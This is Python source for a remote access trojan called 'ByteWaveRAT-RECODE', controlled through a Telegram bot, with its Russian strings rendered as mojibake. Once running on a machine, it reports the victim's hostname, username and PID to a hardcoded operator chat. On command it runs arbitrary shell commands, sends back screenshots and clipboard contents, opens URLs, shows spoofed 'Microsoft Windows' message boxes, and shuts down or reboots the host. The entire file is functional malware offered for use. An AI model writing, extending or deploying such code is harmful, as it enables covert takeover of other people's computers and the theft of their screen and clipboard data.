import telebot
from telebot import types

import time
import urllib.request
import webbrowser
import subprocess
import ctypes
import threading
import os
from pyperclip import paste

from io import BytesIO
from mss import mss

class Client:
    PID = os.getpid()
    username = os.getlogin()
    hostname = os.getenv('COMPUTERNAME') or os.getenv('HOSTNAME')   

AUTHORIZED_CHAT_ID = 1013793895
bot_token = ""
bot = telebot.TeleBot(bot_token)

unauthorized_attempts = {}

def authorized_only(func):
    def wrapper(message):
        if message.chat.id == AUTHORIZED_CHAT_ID:
            func(message)
        else:
            user_id = message.from_user.id
            if user_id not in unauthorized_attempts:
                unauthorized_attempts[user_id] = 1
                try:
                    user_info = bot.get_chat_member(message.chat.id, user_id).user
                    username = user_info.username if user_info.username else f"User ID: {user_id}"
                    bot.send_message(AUTHORIZED_CHAT_ID, f"–ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {username}")
                except telebot.apihelper.ApiException as e:
                    bot.send_message(AUTHORIZED_CHAT_ID, f"–ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID {user_id}")
            else:
                unauthorized_attempts[user_id] += 1

            bot.send_message(message.chat.id, "–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")

    return wrapper

@bot.message_handler(commands=['start'])
@authorized_only
def handle_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    screenshot_button = types.KeyboardButton('/screenshot')
    system_button = types.KeyboardButton('/system')
    help_button = types.KeyboardButton('/help')

    markup.add(screenshot_button, system_button, help_button)
    bot.send_message(message.chat.id, "ByteWaveRAT-RECODE [dev]", reply_markup=markup)

@bot.message_handler(commands=['system'])
@authorized_only
def handle_system(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    shutdown_button = types.KeyboardButton('Shutdown ‚ùå')
    reboot_button = types.KeyboardButton('Reboot üîÑ')
    sleep_button = types.KeyboardButton('Sleep üí§')
    back_button = types.KeyboardButton('Back ‚Ü©Ô∏è')

    markup.add(shutdown_button, reboot_button, sleep_button, back_button)
    bot.send_message(message.chat.id, "System Commands:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == 'Back ‚Ü©Ô∏è')
@authorized_only
def handle_back_to_main_menu(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    screenshot_button = types.KeyboardButton('/screenshot')
    system_button = types.KeyboardButton('/system')
    help_button = types.KeyboardButton('/help')

    markup.add(screenshot_button, system_button, help_button)
    bot.send_message(message.chat.id, "Back to Main Menu", reply_markup=markup)


@bot.message_handler(commands=['help'])
@authorized_only
def handle_help(message):
    response = """
    –°–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥:
    /start - –ù–∞—á–∞—Ç—å
    /tries - –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–ø—ã—Ç–∫–∏ –¥–æ—Å—Ç—É–ø–∞
    /sendmsg <chatid> <text> - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —á–µ–ª–æ–≤–µ–∫—É
    /url <URL> - –û—Ç–∫—Ä—ã—Ç—å URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ
    /clipboard - –°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞
    /screenshot - –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç
    /cmd <command> - –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ
    /msgbox <error|info|question> <text> - –û—Ç–∫—Ä—ã—Ç—å MessageBox
    /system - –ü–æ–∫–∞–∑–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã
    /help - –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å–ø—Ä–∞–≤–∫–∏
    """
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text == 'Shutdown ‚ùå')
@authorized_only
def handle_shutdown(message):
    subprocess.run("shutdown /s", shell=True, capture_output=True, text=True, encoding='cp866')

@bot.message_handler(func=lambda message: message.text == 'Reboot üîÑ')
@authorized_only
def handle_reboot(message):
    subprocess.run("shutdown /r", shell=True, capture_output=True, text=True, encoding='cp866')

@bot.message_handler(func=lambda message: message.text == 'Sleep üí§')
@authorized_only
def handle_sleep(message):
    bot.send_message(message.chat.id, "[SLEEP] in development...")

@bot.message_handler(commands=['clipboard'])
@authorized_only
def handle_tries(message):
    clipboard_content = paste()
    bot.send_message(message.chat.id, f"Clipboard content: {clipboard_content}")

@bot.message_handler(commands=['tries'])
@authorized_only
def handle_tries(message):
    if unauthorized_attempts:
        response = "–ü–æ–ø—ã—Ç–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:\n"
        for user_id, attempts in unauthorized_attempts.items():
            try:
                user_info = bot.get_chat_member(message.chat.id, user_id).user
                username = user_info.username if user_info.username else f"User ID: {user_id}"
                response += f"{username}, –ü–æ–ø—ã—Ç–æ–∫: {attempts}\n"
            except telebot.apihelper.ApiException as e:
                response += f"User ID: {user_id}, –ü–æ–ø—ã—Ç–æ–∫: {attempts}\n"
    else:
        response = "–ù–µ—Ç –ø–æ–ø—ã—Ç–æ–∫ –¥–æ—Å—Ç—É–ø–∞ –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π."

    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['sendmsg'])
@authorized_only
def handle_sendmsg(message):
    try:
        command, target_chat_id, *text_parts = message.text.split(' ')
        target_chat_id = int(target_chat_id)
        text = ' '.join(text_parts)
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {
            'chat_id': target_chat_id,
            'text': text,
        }
        encoded_params = urllib.parse.urlencode(params)
        full_url = f"{url}?{encoded_params}"
        
        urllib.request.urlopen(full_url).read().decode('utf-8')
    except Exception as e:
        bot.send_message(message.chat.id, "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /sendmsg <chatid> <text>")

@bot.message_handler(commands=['url'])
@authorized_only
def handle_url(message):
    try:
        command, url = message.text.split(' ')
        webbrowser.open(url)
    except Exception as e:
        bot.send_message(message.chat.id, "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /url <URL>")

@bot.message_handler(commands=['screenshot'])
@authorized_only
def handle_screenshot(message):
    try:
        with mss() as sct:
            screenshot = sct.shot()
            with open(screenshot, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove("monitor-1.png")
    except Exception as e:
        bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–Ω—è—Ç–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")

@bot.message_handler(commands=['cmd'])
@authorized_only
def handle_cmd(message):
    try:
        command = message.text.split(' ', 1)[1]
        if command.startswith("cd "):
            path = command.split(' ', 1)[1]
            try:
                os.chdir(path)
                response = f"–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞ {os.getcwd()}"
            except Exception as cd_error:
                response = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏: {cd_error}"
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='cp866')
                response = f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
            except Exception as cmd_error:
                response = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {cmd_error}"

        bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /cmd <command>")

def open_msgbox(text, msg_type):
    types = {'error': 0x10, 'info': 0x40, 'question': 0x20}
    if msg_type.lower() not in types:
        return

    msg_type = msg_type.lower()
    icon_type = types[msg_type]

    ctypes.windll.user32.MessageBoxW(0, text, f"Microsoft Windows", icon_type | 0x1000)  # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–ª–∞–≥ MB_SYSTEMMODAL


@bot.message_handler(commands=['msgbox'])
@authorized_only
def handle_msgbox(message):
    try:
        command, msg_type, *text_parts = message.text.split(' ')
        text = ' '.join(text_parts)

        msgbox_thread = threading.Thread(target=open_msgbox, args=(text, msg_type))
        msgbox_thread.start()

        bot.send_message(message.chat.id, f"–û—Ç–∫—Ä—ã—Ç–æ MessageBox —Å —Ç–∏–ø–æ–º {msg_type.capitalize()}.")
    except Exception as e:
        bot.send_message(message.chat.id, "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /msgbox <error|info|question> <text>")



while True:
    try:
        print("BOT STARTED.")
        bot.send_message(AUTHORIZED_CHAT_ID, f"ByteWave RAT [RECODE]: Connected to {Client.hostname}, {Client.username}. PID: {Client.PID}")
        bot.polling(none_stop=True)
    except Exception as e:
        time.sleep(3)
        print(e)
